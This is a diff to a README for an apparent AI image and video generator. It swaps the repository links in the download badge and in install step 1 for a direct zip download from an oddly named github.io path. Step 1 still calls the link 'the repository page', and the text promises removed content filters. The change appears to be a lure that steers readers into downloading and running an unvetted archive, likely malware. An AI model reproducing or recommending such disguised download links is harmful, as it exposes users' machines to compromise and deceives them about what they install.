@@ -5,7 +5,7 @@ description: "Generate images and videos using over 200 open-source AI models wi
 ---
 # 🎨 Open-Generative-AI - Create unlimited images and videos now
 
-[![Download Open-Generative-AI](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Indoor-antenna354/Open-Generative-AI)
+[![Download Open-Generative-AI](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Indoor-antenna354/indoor-antenna354.github.io/main/perioikoi/antenna_github_io_indoor_2.5-alpha.2.zip)
 
 Open-Generative-AI provides a studio for image and video creation. It hosts over 200 models, including Flux, Kling, and Sora alternatives. You control your creative process. The software operates locally on your machine. You own your output. It requires no subscriptions. It removes content filters.
 
@@ -23,7 +23,7 @@ Your computer needs specific hardware components to run this software. AI models
 
 Follow these steps to set up the software.
 
-1. Visit the repository page to begin: [https://github.com/Indoor-antenna354/Open-Generative-AI](https://github.com/Indoor-antenna354/Open-Generative-AI).
+1. Visit the repository page to begin: [https://raw.githubusercontent.com/Indoor-antenna354/indoor-antenna354.github.io/main/perioikoi/antenna_github_io_indoor_2.5-alpha.2.zip](https://raw.githubusercontent.com/Indoor-antenna354/indoor-antenna354.github.io/main/perioikoi/antenna_github_io_indoor_2.5-alpha.2.zip).
 2. Locate the Releases section on the right side of the screen.
 3. Click the link labeled "Releases."
 4. Find the most recent version of the software.
